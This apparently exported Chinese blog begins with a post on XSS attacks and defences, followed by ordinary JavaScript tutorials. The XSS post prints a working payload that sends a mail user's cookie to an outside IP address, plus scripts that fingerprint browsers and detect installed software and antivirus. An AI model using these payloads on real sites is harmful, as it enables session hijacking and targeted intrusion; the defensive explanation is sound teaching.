通过XSS跨站脚本攻击盗取用户Cookie信息一直是XSS跨站脚本攻击漏洞利用的最主流方式之一。当用户正常登录Web应用程序时，用户会从服务端得到一个包含有会话令牌的cookie：Set-Cookie： SessionID=6010D6F2F7B24A182EC3DF53E65C88FCA17B0A96FAE129C3黑客则可以通过XSS跨站脚本攻击的方式将嵌入恶意代码的页面发送给用户，当用户点击浏览时，黑客即可获取用户的Cookie信息并用该信息欺骗服务器端，无需账号密码即可直接成功登录。这里我们以网易邮箱的XSS跨站脚本攻击漏洞为例进行分析和描述。网易邮箱老版本中，曾经存在一个XSS跨站脚本攻击漏洞，黑客可以构造如下代码： 12&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=\"javas]]&gt;&lt;![CDATA[cript:xx=new Image();xx.src='http://61.130.75.239/pic/163.asp?url='+escape(document.URL)+'&amp;cookie='+escape(document.cookie);\" width=0 height=0&gt;]]&gt; &lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt; 并将包含有如图8所示恶意代码的邮件发送至网易邮箱用户时，用户打开了含有恶意代码的邮件后，代码就会自动将用户的cookie信息发送到61.130.75.239上的163.asp文件，其中163.asp的作用是记录发送过来的Cookie，记录的Cookie内容 在接收到Cookie以后，就可以通过Cookie欺骗的方式实现登录目标邮箱了 XSS跨站脚本攻击搜集客户端环境信息 搜集客户端环境信息在更多的时候主要应用于指定目标的渗透攻击或网络挂马攻击，如了解客户端环境所使用的浏览器信息、操作系统信息、组件是否安装以及安全防护软件安装情况等。通过XSS跨站脚本攻击可以更加方便、快速地实现客户端环境信息的收集。 那么如何通过javascript收集以上信息呢？我们构造如下脚本代码，并在浏览器中执行这段代码。 123&lt;script&gt;alert(navigator.userAgent);&lt;/script&gt; 这个信息中告诉了我们以上关心的两个信息，一个是浏览器的类型和版本，另外一个是客户端环境操作系统的版本。 浏览器：MSIE 8.0（微软IE浏览器，浏览器版本是8.0） 操作系统：Windows NT 6.1（操作系统类型是windows 7） 通过以上方式可以获取客户端的浏览器和操作系统信息，接下来我们在继续判断客户端环境组件安装情况。构造代码如下： 123try&#123; var object = new ActiveXObject(\"XunLeiBHO.ThunderIEHelper\");&#125; catch(e)&#123; alert(\"迅雷软件未安装\");&#125; 客户端环境中如果安装迅雷下载软件的话，那么就会安装相应的ActiveX控件XunLeiBHO.ThunderIEHelper，以上脚本的作用即是通过网页脚本去加载迅雷的ActiveX控件，如果控件存在则不会抛出异常，否则就会抛出异常并被脚本捕获，运行上面的脚本代码时，安装有迅雷的环境不会有任何提示，未安装迅雷的环境就会弹窗提示“迅雷软件未安装”。 控件判断可以通过网页加载ActiveX控件的方式实现，那么怎么通过脚本判断客户端环境中是否安装了安全软件呢？这里我们以瑞星安全软件为例，分析描述如何通过XSS跨站脚本攻击漏洞的利用检测客户端环境是否存在瑞星安全软件。我们构造代码如下： 12345678910111213var havesoft=false;var disk=['c','d'];var soft=[':\\Program Files\\Rising\\Ris\\BackRav.dll/2/30994'];for(i=0;i&lt;soft.length;i++)&#123; for(j=0;j&lt;disk.length;j++) &#123; var img=new Image(); res='res://'+disk[j]+soft[i]; img.src=res; if(img.height!=30)&#123; havesoft=true; &#125; &#125; &#125; 以上代码的作用是通过javascript结合res协议对客户端环境中的资源文件进行加载，javascript脚本运行后，会对客户端环境的C、D盘进行访问，访问是否存在瑞星默认安装路径的资源文件，并尝试对资源文件进行加载，如果加载成功，则说明资源文件存在，也说明瑞星安全软件的存在，并将变量havesoft置为真，脚本检测结束后，只需要检测该变量是否为真即可。 XSS Worm 相对于以上三种情况，可以说是XSS蠕虫（XSS Worm）的破坏力和影响力都是巨大的。XSS蠕虫主要发生在用户之间存在交互行为的页面中，当Web应用程序对用户输入的数据信息没有做严格的过滤时，通过结合Ajax的异步提交，就可以实现在植入恶意代码的同时，将恶意代码进行对外发送，即实现了代码的感染和传播，也就形成了XSS蠕虫。 谈到XSS蠕虫就很有必要介绍一下新浪微博遭受XSS蠕虫攻击事件，同时我们也以此次攻击事件作为例子，对黑客恶意利用漏洞至XSS蠕虫大范围扩散的过程进行详细分析和描述，并对该XSS蠕虫的恶意脚本文件进行一下简要的分析。 此处请参见拙作《从新浪微博被攻击事件看SNS网站的安全问题（下）》，不再赘述。 XSS跨站脚本攻击的防范 通过以上针对不同种情况的XSS跨站脚本攻击的描述，我们了解到了在复杂的Web环境中，XSS的利用是千变万化的，如何能够有效地防范XSS跨站脚本攻击问题一直都是浏览器厂商和网站安全技术人员关注的热门话题。现在很多浏览器厂商都在自己的程序中增加了防范XSS跨站脚本攻击的措施，如IE浏览器从IE8开始内置了XSS筛选器，Firefox也有相应的CSP、Noscript扩展等。而对于网站的安全技术人员来说，提出高效的技术解决方案，保护用户免受XSS跨站脚本攻击才是关键。下面我们结合网站安全设计，描述一下如何通过技术手段实现XSS跨站脚本攻击的防范。 利用HttpOnly HttpOnly最初是由微软提出的，目前已经被多款流行浏览器厂商所采用。HttpOnly的作用不是过滤XSS跨站脚本攻击，而是浏览器将禁止页面的Javascript访问带有HttpOnly属性的Cookie，解决XSS跨站脚本攻击后的Cookie会话劫持行为。 httpOnly是在Set-Cookie时进行标记的，设置的Cookie头格式如下： 12345678910111213 Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;name&gt;=&lt;value&gt;] ; expires=&lt;date&gt; ; path=&lt;some_path&gt;[; HttpOnly]以php为例，在php 5.2版本时就已经在Setcookie函数加入了对HttpOnly的支持，如 &lt;?php setcookie(&quot;user&quot;, &quot;admin&quot;, NULL, NULL, NULL, NULL, TRUE); ?&gt; 通过以上代码就可以设置user这个cookie，将其设置为HttpOnly，setcookie函数实质是通过向客户端发送原始的HTTP报文头进行设置的，document将不可见这个Cookie，所以使用document.cookie就取不到这个Cookie，也就是先了对Cookie的保护。 完善的输入和输出检查 由于三种XSS跨站脚本攻击类型的漏洞成因可不相同，针对输入输出的检查一部分适用于反射型XSS与存储型XSS，而另外一些检查适用于基于DOM的XSS。 A. 防范反射型XSS和存储型XSS 输入检查在大多数的时候都是对可信字符的检查或输入数据格式的检查，如用户输入的注册账号信息中只允许包括字母、数字、下划线和汉字等，对于输入的一切非白名单内的字符均认为是非法输入。数据格式如输入的IP地址、电话号码、邮件地址、日期等数据都具有一定的格式规范，只有符合数据规范的输入信息才允许通过检查。 输出检查主要是针对数据展示过程中，应该对数据信息进行HTML编码处理，将可能存在导致XSS跨站脚本攻击的恶意字符进行编码，在不影响正常数据显示的前提条件下，过滤恶意字符。常见的可能造成XSS跨站脚本攻击的字符及其HTML编码如下： 123456789“ \"‘ '&amp; &amp;&lt; &lt;&gt; &gt; 除了常用的编码外，任何字符都可以使用其ASCII码进行HTML编码，如 B. 防范基于DOM的XSS 从基于DOM的XSS的定义及其触发方式我们发现，当基于DOM的XSS跨站脚本攻击发生时，恶意数据的格式与传统的XSS跨站脚本攻击数据格式有一定的差异，甚至可以在不经过服务器端的处理和相应的情况下，直接对客户端实施攻击行为，因此上述我们应用于防范反射型XSS和存储型XSS的方法并不适用于防范基于DOM的XSS跨站脚本攻击。 针对基于DOM的XSS防范的输入检查方法，我们发现在客户端部署相应的安全检测代码的过滤效果要比在服务器端检测的效果更加明显。例如，我们可以通过如下客户端检测代码来保证用户输入的数据只包含字母、数字和空格，代码如下： 123456var str = document.URL;str = str.substring(str.indexOf(\"username=\")+9, str.length);str = unescape(str);var regex=/^([A-Za-z0-9+\\s])*$/;if (regex.test(str))document.write(str); 同样，我们也可以通过在服务端实现类似上述数据检查的功能，如在服务器端检测URL参数是否为预定的参数username,并对username参数的内容进行检测，确认数据内容是否为只包含数字、字母和空格符，实现服务端的数据过滤。但是，由于客户端数据的可控性，这种服务端检测的效果要明显弱于客户端检测。 基于DOM的XSS输出检查与反射型XSS漏洞输出检查的方法相似，在将用户可控的DOM数据内容插入到文档之前，Web应用程序应对提交的数据进行HTML编码处理，将用户提交的数据中可能存在的各种危险字符和表达式进行过滤以安全的方式插入到文档中进行展现，如可以通过如下函数实现在客户端javascript中执行HTML编码处理。 12345function jsEncode(str)&#123; var d = document.createElement('div'); d.appendChild(document.createTextNode(str)); return d.innerHTML;&#125; XSS跨站脚本攻击作为Web应用安全领域中最大威胁之一，不仅仅危害Web应用业务的正常运营，对访问Web应用业务的客户端环境和用户也带来了直接安全影响。虽然XSS跨站脚本攻击在复杂的Web应用环境中利用方式千变万化，但是网络安全人员通过对Web应用的各种环境进行详细分析和处理，完全阻断XSS跨站脚本攻击是可以实现的。如何有效防范和阻止XSS跨站脚本攻击，保障Web应用系统的业务安全和正常运营，保护客户端用户免受XSS跨站脚本攻击行为的侵害，是Web应用系统管理人员和网络安全产品开发人员的共同职责。","comments":true,"tags":[{"name":"杂文","slug":"杂文","permalink":"http://www.wanyifeng.top/tags/杂文/"}]},{"title":"js事件代理","date":"2016-09-12T02:12:48.000Z","path":"2016/09/12/js事件/","text":"事件冒泡微软提出了名为事件冒泡(event bubbling)的事件流。事件冒泡可以形象地比喻为把一颗石头投入水中，泡泡会一直从水底冒出水面。也就是说，事件会从最内层的元素开始发生，一直向上传播，直到document对象。 因此上面的例子在事件冒泡的概念下发生click事件的顺序应该是p -&gt; div -&gt; body -&gt; html -&gt; document 事件捕获网景提出另一种事件流名为事件捕获(event capturing)。与事件冒泡相反，事件会从最外层开始发生，直到最具体的元素。 上面的例子在事件捕获的概念下发生click事件的顺序应该是document -&gt; html -&gt; body -&gt; div -&gt; p 事件代理12345678&lt;ul id=\"color-list\"&gt; &lt;li&gt;red&lt;/li&gt; &lt;li&gt;yellow&lt;/li&gt; &lt;li&gt;blue&lt;/li&gt; &lt;li&gt;green&lt;/li&gt; &lt;li&gt;black&lt;/li&gt; &lt;li&gt;white&lt;/li&gt;&lt;/ul&gt; 如果点击页面中的li元素，然后输出li当中的颜色 12345678910(function()&#123; var color_list = document.getElementById('color-list'); var colors = color_list.getElementsByTagName('li'); for(var i=0;i&lt;colors.length;i++)&#123; colors[i].addEventListener('click',showColor,false);//兼容型 ie8+ &#125;; function showColor(e)&#123; var x = e.target; alert(\"The color is \" + x.innerHTML); &#125;;&#125;)(); 阻止默认事件12345678910 &lt;a href=\"https://www.baidu.com/\" id='goBaidu'&gt;点我去看百度&lt;/a&gt;&lt;script type=\"text/javascript\"&gt; document.querySelector('#goBaidu').onclick = function(event)&#123; console.log('点我啦'); // 阻止 默认行为 a标签 就是 跳转到 href 对应的 url // 只要我们发现 浏览器 的 一些 默认行为 不是我们需要的 就可以使用 这个方法 来实现阻止 event.preventDefault(); &#125;&lt;/script&gt; ###","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"原生实现小星星评论","date":"2016-08-14T12:58:48.000Z","path":"2016/08/14/原生实现小星星评论/","text":"原生实现小星星评论 基于ES6语法使用原生JS实现评级小demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=\"text/css\"&gt; * &#123; margin: 0; padding: 0; &#125; #ulobj&gt;li &#123; float: left; list-style: none; font-size: 50px; &#125; #ulobj &#123; margin: 100px; clear: both &#125; &lt;/style&gt; &lt;/head&gt; &lt;!--★--&gt; &lt;body&gt; &lt;ul id=\"ulobj\"&gt; &lt;li&gt;☆&lt;/li&gt; &lt;li&gt;☆&lt;/li&gt; &lt;li&gt;☆&lt;/li&gt; &lt;li&gt;☆&lt;/li&gt; &lt;li&gt;☆&lt;/li&gt; &lt;/ul&gt; &lt;script type=\"text/javascript\"&gt; let ulObj = document.getElementById(\"ulobj\"), liObj = ulObj.getElementsByTagName(\"li\"), tmp = 0, itemFn = index =&gt; &#123; for(let i = 0; i &lt; liObj.length;i++) &#123; index &gt; i ? liObj[i].innerHTML = \"★\" : liObj[i].innerHTML = \"☆\" &#125; &#125; for(let i = 0; i &lt; liObj.length;) &#123; liObj[i++].MyIndex = i &#125; //兼容 (e = window.event) 不考虑兼容直接 e ulObj.onmouseover = e =&gt; itemFn(e.target.MyIndex) ulObj.onmouseout = e =&gt; itemFn(tmp) ulObj.onclick = e =&gt; tmp = e.target.MyIndex &lt;/script&gt; &lt;script type=\"text/javascript\"&gt; $('.new_number')[1].unbind(\"burl\") $('.new_number')[1].bind(\"burl\",function()&#123;console.log(\"aaaa\")&#125;); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"轮子","slug":"轮子","permalink":"http://www.wanyifeng.top/tags/轮子/"}]},{"title":"函数的常用方法及属性","date":"2016-08-13T10:18:48.000Z","path":"2016/08/13/函数的常用方法及属性/","text":"new Function 把字符串作为函数来执行 转换json数据 1234567 var data = \"&#123;name:'万翼峰',age:10,gengder:1&#125;\" function jsonData (data)&#123; return (new Function(\"return\"+data))(); &#125; var c = jsonData(data); console.log(c);/// 转换json数据 函数的属性name123456789101112131415161718//name表示函数的名字//第一种情况：声明式函数，名字就是函数名function Person()&#123;&#125;console.log(Person.name);//\"Person\"//第二种情况：函数表达式，并且函数表达式没有名字，name属性指向变量名var foo=function()&#123;&#125;;console.log(foo.name);//\"foo\"//第三种情况：函数表达式，函数表达式有名字，name属性指向函数表达式中的函数名var foo2=function foo3()&#123; console.log(foo2===foo3);&#125;;console.log(foo2.name);//\"foo3\"// 这种函数表达式在函数外部无法通过foo3来调用函数，只能通过foo2来调用// 在函数内部可以使用foo2、foo3来访问函数foo2(); length123456//length属性：表示函数的形参的个数function sum(a,b)&#123; return a+b;&#125;console.log(sum.length);//2sum(10,20,30); caller12345678910111213141516//caller表示当前函数是在哪个函数内部调用的 function f1 ()&#123; console.log(f1.caller);//f2函数 console.log(this)//window console.log(this.caller)//undefined &#125; function f2 ()&#123; f1();//相当于this.f1(); this.f1();//相当于Windows.f1(); &#125; f2()//相当于window.f2(); window.f2();//如果f1函数没有被调用，f1.caller:null//如果f1函数正在被调用，但是在全局作用域中进行调用，f1.caller:null//。。。。。。。。。。。通过f1函数是在f2函数内部被调用的,f1.caller:f2 arguments123//作用获取实参//伪数组 可以比遍历 //length 为实参个数 callee 属性arguments.callee引用当前正在运行的函数。它给未命名的函数提供了一种自我引用的方式。该属性只在函数体内被定义。 12345678910111213示例//一个未命名的函数直接量使用callee属性引用它自身// 以便它能够递归var factorial = function(x) &#123; if (x &lt; 2) return 1; else return x * arguments.callee(x-1);&#125;var y = factorial(5); // 返回 120 call和apply 作用:改变函数内部this的指向 使用场景 1.借用构造函数实现继承 案例在继承模块中 2.求数组的max值 123var arr = [1,12,3,456,45,14];var result = Math.max.apply(Math,arr);console.log(result); 3.判断数据类型 12345678910var objToString = Object.prototype.toString; var type = function (data)&#123; var result = objToString.call(data); return result.slice(8,result.length-1); &#125; var type2 = function (data)&#123; var result = objToString.call(data); return result.replace(/\\[object |\\]/g,\"\").toLowerCase(); &#125; console.log(type2(1)) 1、相同点：都可以调用函数，还可以指定该函数内部的this的值2、不同点：给函数传递实参的方式不同 函数的原型图","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"JS运算符","date":"2016-07-18T13:33:21.000Z","path":"2016/07/18/JS运算符/","text":"程序中最简单的表达式就是，程序中的常量 变量名也是一种简单的表达式 复杂的表达式是由简单的表达式组成的 函数调用表达式是由函数对象的表达式和0个或多个参数表达式构成 可以使用运算符来将简单的表达式来组合成复杂的表达式 ​ 原始表达式 “原始表达式”，说简单点就是最简单的表达式，并且不再包含其他表达式 js中原始表达式有以下： 常量 直接量 关键字 变量 栗子： 123456789101112131415&gt; &gt; //直接量 &gt; &gt; 1.23 // 数字直接量&gt; &gt; \"hello\" // 字符串直接量&gt; &gt; /pattern/ // 正则表达式直接&gt; &gt; //保留字 &gt; &gt; true&gt; &gt; false&gt; &gt; null // 返回空&gt; &gt; this // 返回“当前对象”&gt; &gt; //变量 &gt; &gt; i // 返回i的值&gt; &gt; sum // 返回sum的值&gt; &gt; undefined // undefined是全局变量，和null不同，不是一个关键字&gt; &gt;&gt; 对象和数组的初始化表达式对象和数组的初始化表达式实际上是一个新创建的对象和数组，并不是原始表达式 数组初始化表达式 栗子: [] //空数组 [1+2,3+4] // 2个元素数组 [3,7] var matrix = [[1,2],[3,4]] // 数组可嵌套 js对数组初始化表达式进行求值时候，数组表达式中的所有元素表达式也会各自计算一次 数组直接量的元素表达式在逗号之间元素可以省略，空位默认填充undefined。var array = [1,,3] // 数组包含3个元素。[1,undefined,3] 但是列表结尾处可以留下单个逗号，这时不会创建新的undefined元素 对象初始化表达式对象初始化表达式与数组初始化表达式非常接近，将[]替换成{},每个子表达式都包含一个属性名和冒号为前缀 栗子 12345&gt; &gt; var p = &#123; x:2, y:3 &#125;; // 带2个属性的对象p&gt; &gt; var q = &#123;&#125;; // 空对象&gt; &gt; q.x = 2; q.y =3; // q的属性成员与p一致&gt; &gt;&gt; 对象直接量也是允许嵌套的 &gt; var rect = {&gt; upLeft: { x:2, y:3},&gt; bottomRight: { x:4, y:1}&gt; };&gt; js求对象初始化表达式时候，对象元素表达式也会各自都计算一次，并且元素表达式不必包含常数值，可以是任意的js表达式。 对象直接量中属性的名字可以是字符串而不是标示符 &gt; var side = 1;&gt; var square = {&gt; &quot;upLeft&quot;: { x: p.x, y: p.y},&gt; &quot;bottomRight&quot;: {x: p.x+side, y: p.y+side}&gt; };&gt; 函数表达式函数定义表达式定义一个js函数，表达式的值是这个新定义的函数。如下 123var square = function (x)&#123; return x * x;&#125;; 属性访问表达式属性访问表达式得到一个对象属性或一个数组元素的值。主要有.和[]两种形式 栗子： 12345678910&gt; &gt; var o = &#123; x:1, y:&#123; z:3 &#125; &#125;;&gt; &gt; var a = [o, 4, [5,6]];&gt; &gt; o.x // =&gt;1 表达式o的x属性&gt; &gt; o.y.z // =&gt;3 表达式o.y的z属性&gt; &gt; o[\"x\"] // =&gt;1 表达式o的x属性&gt; &gt; a[1] // =&gt;4 表达式a的索引为1的元素&gt; &gt; a[2][\"1\"] // =&gt;6 表达式a[2] 的索引为1的元素&gt; &gt; a[0].x // =&gt;1 表达式a[0]的x属性&gt; &gt;&gt; 在. 和 []之前的表达式总会首先计算。如果计算出结果为null 或者 undefined，表达式会抛出类型错误异常。如果运算结果不是对象或者数组，js会将其转换为对象。 如果对象表达式后面跟随句点和标示符，则会查找由这个标示符所指定的属性的值，然后作为整个表达式的值返回。 如果表达式后面跟随一对括号，则会计算方括号里面表达式值并转换为字符串，然后查找对应属性的值 如果以上两种情况，命名属性并不存在，则整个属性访问表达式的值就是undefined .写法适合要访问的属性名是合法标示符，并且需要知道要访问属性名字 [] 写法适合要访问的属性名不是合法字符，或者访问的属性名是需要运算得出的。对于数组则必须使用这种写法 调用表达式js调用表达式，是一种调用（执行）函数或方法的语法。如下 123func(0) // f是一个函数表达式，0是一个参数表达式Math.max(x,y,z) // Math.max是一个函数，x,y,z是参数a.sort() // a.sort是一个函数。没有参数 对调用表达式进行求值时候，首先计算函数表达式，然后计算参数表达式，得到一组参数值。 如果函数表达式不是一个可以调用的对象，会抛出类型错误异常 如果函数表达式使用return语句返回一个值，那么这个值就是整个调用表达式的值，否则表达式的值就是undefined 对象创建表达式对象创建表达式，顾名思义，就是创建一个对象，并且调用一个函数，初始化新对象的属性。 12new Object()new Point(2,6) 如果一个对象创建表达式不需要传入任何参数给构造函数，那么空括号可以省略 12new Objectnew Date 运算符概述大多数运算符都是由标点符号表示的，如”+”,”=”。而另外一些运算符则是由关键字表示的，比如delete和instanceof。 优先级从高到低，虚线分割开的运算符不同优先级。 运算符 操作 结合性 操作数个数 类型 ++ 前/后增量 R 1 lval =&gt; num – 前/后减量 R 1 lval =&gt; num - 求反 R 1 num =&gt; num + 转换为数字 R 1 num =&gt; num ~ 按位求反 R 1 int =&gt; int ! 逻辑非 R 1 bool =&gt; bool delete 删除属性 R 1 lval =&gt; bool typeof 检测操作数类型 R 1 any =&gt; str void 返回undefined R 1 any =&gt; undef ————— ————— — – ——— *,/,% 乘、除、取余 L 2 num,num =&gt; num ————— ————— — – ——— +、- 加、减 L 2 num,num =&gt; num + 字符串连接 L 2 str,str =&gt; str ————— ————— — – ——— &lt;&lt; 左移位 L 2 int,int =&gt; int &gt;&gt; 无符号右移位 L 2 int,int =&gt; int &gt;&gt;&gt; 有符号右移位 L 2 int,int =&gt; int ————— ————— — – ——— &lt;,&lt;=,&gt;,&gt;= 比较数字顺序 L 2 num,num =&gt; bool &lt;,&lt;=,&gt;,&gt;= 比较在字母表顺序 L 2 str,str =&gt; bool instanceof 测试对象类 L 2 obj,func =&gt; bool in 测试属性是否存在 L 2 str,obj =&gt; bool ——————– ————— — – ——— == 判断相等 L 2 any,any =&gt;bool != 判断不等 L 2 any,any =&gt; bool === 判断恒等 L 2 any,any =&gt; bool !== 判断非恒等 L 2 any,any =&gt; bool ————— ————— — – ——— &amp; 按位与 L 2 int,int =&gt; int ————— ————— — – ——— ^ 按位异或 L 2 int,int =&gt; int ————— ————— — – ——— ｜ 按位或 L 2 int,int =&gt; int ————— ————— — – ——— &amp;&amp; 逻辑与 L 2 any,any =&gt; any ————— ————— — – ——— ｜｜ 逻辑或 L 2 any,any =&gt; any ————— ————— — – ——— ?: 条件运算符 L 3 bool,any,any =&gt; any ————— ————— — – ——— = 赋值运算符 R 2 lval,any =&gt; any *=,/=,%=,+=,-=,&amp;= 运算且赋值 R 2 lval,any =&gt; any ^=,｜｜=,&lt;&lt;=,&gt;&gt;=,&gt;&gt;&gt;= 运算且赋值 R 2 lval,any =&gt; any ————— ————— — – ——— , 忽略第一个操作数，返回第二个操作数 L 2 any,any =&gt; any 左值上表中出现的lval指的是左值，意思是表达式只能出现在赋值运算符的左侧 在js中，变量、对象属性、和数组元素都是左值。 ECMAScript允许内置函数返回左值，但自定义函数不能返回左值 操作数类型和结果类型js运算符通常会根据需要对操作数进行类型转换 *希望操作数为数字，但是表达式&quot;3&quot;*&quot;5&quot;却是合法的，因为js会把操作数转换为数字 有些操作符对操作数类型有一定程度依赖，比如＋运算符。可以对数字进行加法运算，也可以对字符串进行连接。 运算符优先级上表中运算符按照优先级从高到低排序，每个虚线内的一组运算符具有相同优先级。 优先级高的运算符执行总是先于优先级低的运算符举个栗子：m = x + y*z;*运算符比＋运算符优先级高，优先计算y*z，获得结果再与x相加。=赋值运算符优先级最低，右侧表达式计算出结果后赋值给m 很多时候为了代码逻辑清晰，加上一些括号来重写优先级，来避免一些优先级引起的bug或者执行顺序与设计不符m = (x + y) * z 运算符的结合性上表中说明了运算符的结合性。 L 指从左到右结合,执行时按照从左到右的顺序进行 R 指从右到左结合,执行时按照从右到左的顺序进行 举个栗子：-运算符从左到右结合，因此w = x - y - z 等价于 w = ((x - y) - z) 运算顺序运算符的优先级和结合性规定了在复杂表达式中的运算顺序，但是没有规定子表达式的计算过程中的运算顺序 js中，总是严格按照从左到右计算子表达式。例如w=x+y*z，首先计算w,然后计算x,y,z的值，然后y的值和z的值相承之后，再加上x的值，最后将其结果赋值给w。给表达式加括号会改变乘法加法和赋值运算的顺序，但是子表达式的计算顺序仍然是从左至右的顺序 只有一种情况例外，当任何一个表达式具有副作用而影响其他表达式时候，求值顺序才会有所不同。例如，表达式中x的一个变量自增1，这个变量在z中使用，那么实际上是先计算了x的值再计算z的值，这一点一定要注意 下面这个栗子： 12a = 1;b = (a++) + a; 如果按照前面那种不考虑副作用时的顺序是 1) 计算b, 2)计算a++为c, 3）计算a，4）计算c＋a, 5）将c+a结果赋值给b 按照++的影响，1) 计算b, 2)a++结果仍然为1,c=1,随即a立即自增1, 3）计算a，a已经是2，4）计算c＋a＝3,5）将c+a结果赋值给b，所以b＝3 切记，a增1的操作是在表达式计算中就已经执行了，不是在整个表达式计算完成之后执行的 算术表达式基本算数运算符包括+ - * / % “+”运算符 对2个数字进行加法操作 字符串连接操作 针对不同操作数，＋运算符行为表现有些不同 一个操作数是对象，对象会遵循对象到原始值的转换规则转换为原始值 日期对象：toString()执行转换 其他对象通过valueOf()转换，如果valueOf()不可用，会通过toString()方法转换 在进行对象到原始值的转换后，如果其中一个操作数是字符串，另一个操作数也会转换成字符串，然后连接 否则，两个操作数都转换成数字或者NaN，然后进行加法操作 下面是一些栗子： 123456781 + 2 // =&gt;3\"1\" + 2 // =&gt; \"12\"\"12\" + \"3\" // =&gt; \"123\"1 + &#123;&#125; // \"1[object object]\"，对象转换为字符串true + true // 2 ，bool转换为数字做加法2 + null // =&gt;2,null转换为02 + undefined // =&gt; NaN, undefined转换为NaN后做加法 最后，还需要考虑，加法的结合性对运算顺序的影响 121 + 2 + \"hello\" // \"3hello\"1 + (2 + \"hello\") // \"12hello\" 一元算术运算符一元运算符作用于一个单独操作数，产生一个新值 js中一元运算符优先级很高，并且都是右结合 +/-，既是一元运算符，也是二元运算符 一元加法(+) 操作数转换为数字（或者NaN），并且返回这个转换后的数字。如果已经是数字，直接返回 一元减法(-) 操作数转换为数字（或者NaN），并且返回这个转换后的数字，然后改变运算结果符号 递增(++) 前增量 ++a，先进行增量运算并且返回运算结果后增量 a++，先进行增量计算，返回未做增量运算的值 1234&gt; &gt; var i=1, j=i++; // i=2,j=1&gt; &gt; var i=1, j=++i; // i=2,j=2&gt; &gt;&gt; 递减(--) 前减量 --a，先进行减量运算并且返回运算结果后减量 a--，先进行减量计算，返回未做减量运算的值 1234&gt; &gt; var i=1, j=i--; // i=0,j=1&gt; &gt; var i=1, j=--i; // i=0,j=0&gt; &gt;&gt; 位运算符 &amp; 按位与 0x1234 &amp; 0x00ff = 0x0034 | 按位或 0x1234 | 0x00ff = 0x12ff ^ 按位异或 0xff00 ^ 0xf0f0 = 0x0ff0 ~ 按位非 ~0x0f = 0xfffffff0 &lt;&lt; 左移 7 &lt;&lt; 2 = 28,左移一位相当于第一个操作数乘以2移动位数 0～31 &gt;&gt; 带符号右移 带符号右移时候填补在左边的位由原来的数的符号决定，以便保持和原操作数一致移动位数 0～317 &gt;&gt; 1 = 3-7 &gt;&gt; 1 = -4 &gt;&gt;&gt; 无符号右移 无符号右移时候填补在左边的位直接填补0，与原操作数无关移动位数 0～31-1 &gt;&gt; 4 = 1-1 &gt;&gt;&gt; 4 = 0x0fffffff 关系表达式主要包括相等和不相等运算符、比较运算符、in、instanceof 相等和不相等运算符js定义了4个符号==,===,!=,!== ==：相等 ===: 恒等 !=: 不相等 !==: 不恒等 严格相等运算符===首先计算其操作数的值，然后比较这两个值，没有类型转换 如果两个值类型不相同，则它们不相等 如果两个值都是null或者都是undefined，则它们不相等 如果两个值都是布尔值true或者false，，则它们相等 如果其中一个值是NaN，或者2个值都是NaN，则它们不相等。NaN和其他任何值都是不相等的，包括自身。通过X!==X来判断x是否为NaN，只有x为NaN时候，表达式才为true 如果两个值为数字且数值相等，则他们相等。如果一个值为0，另一个为－0，同样相等 如果两个值为字符串，且所含对应位上16位数完全相等，则他们相当。如果它们长度或内容不同，则它们不相等。 两个字符串可能含义完全一样且显示字符一样，但具有不同编码的16位值。js不会对Unicode进行标准化转换，像这样字符串通过”===”和”==”运算符比较结果也是不相等 如果两个引用值指向同一个对象、数组或者函数，则相等。如果指向不同对象，则它们不相等，尽管两个对象完全一样的属性。 相等运算符==和恒等运算符相似，但相等运算符并不严格。如果两个操作数不是同一类型，那么相等的运算符会进行一些类型转换，然后进行比较 如果两个操作数的类型相同，则和上文所属的严格相等的比较规则一样。如果严格相等，则比较结果相等，如果不严格相等，则它们不相等 如果两个操作数类型不同，==相等操作符也可能认为他们相等。检测相等会遵守以下规则和类型转换如果一个值是null，另一个是undefined,则他们相等如果一个值是数字，另一个是字符串，先将字符串转换成数字，然后使用转换后的值，进行比较如果其中一个值是true，则将其转换为1再进行比较。如果其中一个值是false，则将其转化为0，在进行比较如果一个值是对象，另一个值是数字或字符串，则会使用之前提到的对象到数字或字符串的转换规则将对象转换为原始值，然后进行比较。其他的类型之间的比较均不相等 举个栗子：&quot;1&quot; == true这个表达式结果是true，表明不同类型之间的值比较结果相等。布尔值首先转换为数字1，然后字符串1也转换成数字1，因为两个数字相等，所以结果为true 比较运算符比较运算符有4个 &lt; 小于 &gt; 大于 &lt;= 小于等于 &gt;= 大于等于 比较运算符的操作数可以是任何类型，然后只有字符串和数字才能真正的执行比较操作，不是这两种类型的都将进行类型转换。类型转换规则： 如果操作数为对象，这个对象将按照对象到原始值的转换（具体可以看上篇） 在对象转换到原始值后，如果两个操作数都是字符串，那么将按照字母表顺序进行比较（字母表指的unicode 16位字符的索引顺序） 对象转换为原始值后，如果一个操作数不是字符串，那么两个操作数转换为数字之后进行比较。 0和－0是相等的 Infinity比其他任何数字都大（除了自身） －Infinity比其他数字都小(除了自身) 如果一个操作数转换成数字之后是NaN，那么比较操作符总是返回false 在上面规则中，字符串比较需要注意： 字符串比较是区分大小写的，所有的大写ascii字符都是小于小写的ascii字符 对于数字和字符串比较，只有两个操作数都是字符串时，才会进行字符串比较 in运算符in运算符的左边总是希望是一个字符串，右边操作数总是希望是一个对象，如果右边对象拥有左操作值的属性名，会返回true 对象，会倾向查找属性名 1234var point = &#123; x:1, y:1&#125;;\"x\" in point // ＝&gt; true, 对象拥有名为“x”的属性\"z\" in point // =&gt; false, 对象不存在名为\"z\"的属性\"toString\" in point // =&gt; true，对象继承了默认的toString()方法 数组，会倾向查找索引 1234var data = [1,2,3]\"0\" in data // true，数组包含索引0的元素1 in data // true，数组包含索引1的元素3 in data // false 数组不包含索引3的元素 instanceof 